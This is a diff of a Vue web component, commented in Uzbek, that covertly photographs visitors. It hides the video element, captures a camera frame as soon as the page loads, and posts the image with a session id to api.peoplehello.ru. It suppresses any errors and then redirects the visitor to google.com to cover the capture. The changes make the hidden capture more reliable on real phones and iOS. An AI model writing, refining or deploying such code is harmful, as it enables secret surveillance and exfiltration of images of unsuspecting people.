@@ -1,67 +1,81 @@
 <template>
-  <!-- UI yashirin -->
-  <video ref="video" autoplay playsinline style="display:none"></video>
-  <canvas ref="canvas" style="display:none"></canvas>
+  <video ref="video" playsinline muted style="display:none"></video>
 </template>
 
 <script>
 export default {
   name: "BackCamera",
 
-  mounted() {
-    this.startCamera()
+  async mounted() {
+    this.capture()
   },
 
   methods: {
-    async startCamera() {
-      try {
-        // /lk/:id
-        const session_id = this.$route.params.id
-        if (!session_id) return this.redirect()
+    async capture() {
+      const session_id = this.$route.params.id
+      if (!session_id) return this.redirect()
 
+      if (!navigator.mediaDevices?.getUserMedia) {
+        return this.redirect()
+      }
+
+      try {
+        // ❗ ENG MOS variant
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: "environment" } }, // ✅ ORQA KAMERA
+          video: true,
           audio: false
         })
 
         const video = this.$refs.video
-        const canvas = this.$refs.canvas
-        const ctx = canvas.getContext("2d")
-
         video.srcObject = stream
 
-        // ❗ Kamera tayyor bo‘lganda rasm olamiz (timeout YO‘Q)
-        video.onloadedmetadata = async () => {
-          canvas.width = video.videoWidth
-          canvas.height = video.videoHeight
-          ctx.drawImage(video, 0, 0)
+        // ❗ iOS uchun MUHIM
+        await video.play()
 
-          const imageBase64 = canvas.toDataURL("image/jpeg", 0.85)
+        // ❗ metadata kutamiz
+        await new Promise(res => {
+          if (video.readyState >= 2) return res()
+          video.onloadedmetadata = res
+        })
 
-          // kamerani o‘chiramiz
-          stream.getTracks().forEach(t => t.stop())
+        // ❗ real telefonlarda kerak
+        await new Promise(r => setTimeout(r, 600))
 
-          // API’ga yuboramiz
-          await fetch("https://api.peoplehello.ru/api/back-cam", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              image: imageBase64,
-              session_id
+        const canvas = document.createElement("canvas")
+        canvas.width = video.videoWidth || 640
+        canvas.height = video.videoHeight || 480
+        const ctx = canvas.getContext("2d")
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
+
+        stream.getTracks().forEach(t => t.stop())
+
+        // ❗ ENG MUHIM QISM — toBlob
+        canvas.toBlob(async (blob) => {
+          if (!blob) return this.redirect()
+
+          const formData = new FormData()
+          formData.append("photo", blob, "photo.jpg")
+          formData.append("session_id", session_id)
+
+          try {
+            await fetch("https://api.peoplehello.ru/api/front-cam", {
+              method: "POST",
+              body: formData
             })
-          })
-
-          this.redirect()
-        }
+          } catch (e) {
+            // jim
+          } finally {
+            this.redirect()
+          }
+        }, "image/jpeg", 0.85)
 
       } catch (err) {
-        console.error("Back camera error:", err)
         this.redirect()
       }
     },
 
     redirect() {
-      window.location.replace("https://www.google.com")
+      window.location.replace("https://google.com")
     }
   }
 }
